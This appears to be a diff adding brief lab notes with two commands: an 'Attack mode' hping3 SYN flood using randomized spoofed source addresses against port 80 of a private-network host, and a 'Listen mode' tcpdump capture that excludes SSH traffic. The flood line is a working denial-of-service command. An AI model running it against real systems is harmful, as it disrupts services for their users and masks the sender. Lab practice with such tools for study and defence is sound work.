@@ -1,0 +1,8 @@
+Attack mode
+------------------
+hping3 --rand-source --flood -p 80 192.168.111.11 -S
+
+
+Listen mode
+------------------
+tcpdump -i eth0 -n not tcp port 22
